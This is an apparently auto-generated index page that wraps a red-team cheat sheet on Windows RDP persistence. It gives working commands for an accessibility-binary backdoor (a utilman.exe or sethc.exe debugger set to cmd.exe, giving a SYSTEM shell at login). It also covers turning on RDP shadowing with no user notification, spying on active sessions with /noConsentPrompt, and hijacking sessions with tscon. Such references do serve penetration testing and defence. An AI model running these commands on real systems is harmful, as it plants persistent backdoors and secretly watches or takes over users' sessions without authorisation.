---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# RDP - Persistence

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-redteam-persistence-rdp-persistence` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/persistence/rdp-persistence.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [RDP - Persistence](../../topics/redteam/rdp-persistence.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-redteam-persistence-rdp-persistence |
| name | RDP - Persistence |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/persistence/rdp-persistence.md |

## Preserved Source Material

````yaml
_body: "# RDP - Persistence\n\n## RDP Backdoor\n\nAn RDP backdoor is a malicious technique where an attacker replaces the\
  \ legitimate binary files of utility manager (utilman.exe) or sticky keys (sethc.exe) with a command prompt (cmd.exe) executable.\
  \ This allows the attacker to gain unauthorized access to the system by launching a command prompt when the ease of access\
  \ or sticky keys button is pressed on the login screen, bypassing the need for authentic credentials.\n\n### utilman.exe\n\
  \nAt the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM.\n\n```powershell\nREG ADD \"HKLM\\SOFTWARE\\\
  Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /t REG_SZ /v Debugger /d \"C:\\windows\\\
  system32\\cmd.exe\" /f\n```\n\n### sethc.exe\n\nHit F5 a bunch of times when you are at the RDP login screen.\n\n```powershell\n\
  REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /t REG_SZ /v\
  \ Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f\n```\n\n## RDP Shadowing\n\nRDP shadowing is a feature of Remote Desktop\
  \ Protocol (RDP) that allows a remote user to view or control another user's active RDP session on a Windows computer. This\
  \ feature is typically used for remote assistance, training, or collaboration purposes, allowing one user to observe or\
  \ take control of another user's desktop, applications, and input devices as if they were physically present at the computer.\n\
  \n**Requirements**\n\n* `TermService` must be running\n\n    ```ps1\n    sc.exe \\\\MYSERVER query TermService\n    sc.exe\
  \ \\\\MYSERVER start TermService\n    ```\n\n* `SYSTEM` privilege or the account's password\n\n**Enable RDP Shadowing**\n\
  \nShadow Remote Desktop Session can be enabled by editing the `HKLM\\Software\\Policies\\Microsoft\\Windows NT\\Terminal\
  \ Services` registry key.\n\n| Value | Name                  | Description |\n| ----- | --------------------- | --- |\n\
  |   0   | Disable               | Remote control is disabled. |\n|   1   | EnableInputNotify     | The user of remote control\
  \ has full control of the user's session, with the user's permission. |\n|   2   | EnableInputNoNotify   | The user of remote\
  \ control has full control of the user's session; the user's permission is not required. |\n|   3   | EnableNoInputNotify\
  \   | The user of remote control can view the session remotely, with the user's permission; the remote user cannot actively\
  \ control the session. |\n|   4   | EnableNoInputNoNotify | The user of remote control can view the session remotely, but\
  \ not actively control the session; the user's permission is not required. |\n\nUsually you want to be able to see and interact\
  \ with the Remote Desktop: option 2 `EnableInputNoNotify`.\n\n```ps1\nreg.exe query \"\\\\MYSERVER\\HKLM\\Software\\Policies\\\
  Microsoft\\Windows NT\\Terminal Services\" /V Shadow\nreg.exe add \"\\\\MYSERVER\\HKLM\\Software\\Policies\\Microsoft\\\
  Windows NT\\Terminal Services\" /V Shadow /T REG_DWORD /D 2 /F\n```\n\nIf you encounter any trouble with the network, enable\
  \ the `Remote Desktop - Shadow (TCP-In)` firewall rule.\n\n```ps1\n$so = New-CimSessionOption -Protocol Dcom\n$s = New-CimSession\
  \ -ComputerName MYSERVER -SessionOption $so\n$fwrule = Get-CimInstance -Namespace ROOT\\StandardCimv2 -ClassName MSFT_NetFirewallRule\
  \ -Filter 'DisplayName=\"Remote Desktop - Shadow (TCP-In)\"' -CimSession $s\n$fwrule | Invoke-CimMethod -MethodName Enable\n\
  ```\n\n**Enumerate active users**\n\nQuery to enumerate active users on the machine.\n\n```ps1\nquser.exe /SERVER:MYSERVER\n\
  query.exe user /server:MYSERVER\nqwinsta.exe /server:MYSERVER\n```\n\n**Use the shadow mode**\n\nUse the `noConsentPrompt`\
  \ parameter and specify the session ID obtained from the previous command.\n\n```ps1\nMSTSC [/v:<server[:port]>] /shadow:<sessionID>\
  \ [/control] [/noConsentPrompt]\nmstsc /v:SRV2016 /shadow:1 /noConsentPrompt\nmstsc /v:SRV2016 /shadow:1 /noConsentPrompt\
  \ /control\n```\n\nOn older version you have to use  `tscon.exe` instead.\n\n```ps1\npsexec -s cmd\ncmd /k tscon 2 /dest:console\n\
  ```\n\n## References\n\n* [Spying on users using Remote Desktop Shadowing - Living off the Land - Mar 26, 2021 - @bitsadmin](https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing)\n\
  * [RDP Hijacking for Lateral Movement with tscon - ired.team - 2019](https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement)"
_relative_path: redteam/persistence/rdp-persistence.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/persistence/rdp-persistence.md
````
